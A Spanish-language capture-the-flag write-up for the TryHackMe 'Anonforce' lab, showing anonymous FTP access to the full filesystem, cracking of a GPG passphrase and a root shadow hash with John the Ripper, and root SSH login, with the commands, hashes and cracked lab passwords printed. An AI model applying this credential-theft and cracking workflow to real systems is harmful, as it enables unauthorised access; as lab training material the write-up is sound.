# Anonforce — TryHackMe Writeup

**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Boot2Root  
**Date:** 2026-05-10

---

## Resumen

Máquina easy boot2root del CTF BSides Guatemala. Expone un FTP con login anónimo que da acceso al sistema de archivos completo. Dentro se encuentra una clave privada GPG y un backup cifrado. Crackear la clave con John + rockyou permite descifrar el backup, que resulta ser un `/etc/shadow` con el hash de root. Hash crackeado → acceso SSH directo como root.

**Skills trabajadas:** enumeración de servicios, FTP anónimo, GPG/PGP, cracking con John the Ripper, SSH.

---

## Reconocimiento

```bash
nmap -sV -sC -Pn <IP>
```

![nmap scan](TryHackMe/Anonforce/assets/5.png)

|Puerto|Servicio|Versión|
|---|---|---|
|21/tcp|FTP|vsftpd 3.0.3 — **anonymous login allowed**|
|22/tcp|SSH|OpenSSH 7.2p2 Ubuntu|

> **Nota pentesting:** Nmap con `-sC` lanza el script `ftp-anon` automáticamente. Si anonymous login está habilitado, lo detecta y lista el directorio raíz. Aquí ya se ve la carpeta `notread` en el output de Nmap.

---

## FTP — Acceso anónimo

```bash
lftp <IP>
```

Login con usuario `anonymous`, sin contraseña. El FTP expone el sistema de archivos raíz completo — error de configuración grave (el usuario anónimo debería estar enjaulado en un directorio específico, no en `/`).

![lftp navegación y descarga](TryHackMe/Anonforce/assets/1.png)

Navegando el sistema de archivos se encuentra `/notread/`, con permisos `drwxrwxrwx` (world-writable, otra red flag):

```
/notread/
├── backup.pgp      # archivo cifrado con PGP
└── private.asc     # clave privada GPG
```

Descarga de ambos archivos:

```bash
get backup.pgp
get private.asc
```

> **Nota pentesting:** Tener el archivo cifrado y la clave privada en el mismo lugar es equivalente a dejar el candado y la llave juntos. El cifrado no aporta ninguna seguridad en este escenario.

---

## GPG — Cracking de clave privada y descifrado

### 1. Convertir la clave privada a formato John

```bash
gpg2john private.asc > hash
```

### 2. Crackear la passphrase

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![gpg2john + john crack](TryHackMe/Anonforce/assets/2.png)

**Passphrase encontrada:** `xbox360`

> **Nota pentesting:** `gpg2john` es parte de John the Ripper y convierte claves GPG/PGP al formato de hash que John puede procesar. El cifrado de la clave privada con una passphrase débil (presente en rockyou) hace que la protección sea trivialmente bypasseable.

### 3. Importar la clave y descifrar el backup

```bash
gpg --import private.asc
# passphrase: xbox360

gpg --decrypt backup.pgp
```

El backup descifrado resulta ser un volcado de `/etc/shadow`:

```
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
```

|Usuario|Hash type|Identificador|
|---|---|---|
|root|SHA-512|`$6$`|
|melodias|MD5|`$1$`|

---

## Cracking del hash de root

```bash
echo 'root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::' > shadow_root

john shadow_root --wordlist=/usr/share/wordlists/rockyou.txt
```

![john cracking shadow](TryHackMe/Anonforce/assets/3.png)

**Password root:** `hikari`

---

## Acceso SSH — Root

```bash
ssh root@<IP>
# password: hikari
```

![ssh root access](TryHackMe/Anonforce/assets/4.png)

Acceso directo como root. Flags recogidas en `/home/melodias/user.txt` y `/root/root.txt`.

---

## Flags

|Flag|Ubicación|
|---|---|
|user.txt|`/home/melodias/user.txt` — accesible desde FTP directamente|
|root.txt|`/root/root.txt` — tras comprometer root|

---

## Lo aprendido

- **GPG/PGP en pentesting:** primera vez trabajando con `gpg2john` + `gpg --import` + `gpg --decrypt`. El flujo es: convertir la clave privada a hash → crackear passphrase → importar clave → descifrar el archivo. Herramienta a tener en el toolkit para cualquier escenario donde aparezcan archivos `.pgp`, `.asc`, o `.gpg`.
- **Identificación de hashes en `/etc/shadow`:** el prefijo `$6$` indica SHA-512 (moderno), `$1$` indica MD5 (legacy). Relevante para elegir el modo correcto en John o Hashcat.
- **FTP anónimo con acceso a `/`:** caso real de misconfiguration crítica. En un engagement real, acceso de lectura al sistema de archivos completo via FTP anónimo es un hallazgo de severidad alta.
- **Nmap `-sC`:** los NSE scripts de Nmap (como `ftp-anon`) automatizan checks que de otro modo harías manualmente. Siempre usarlo en reconocimiento.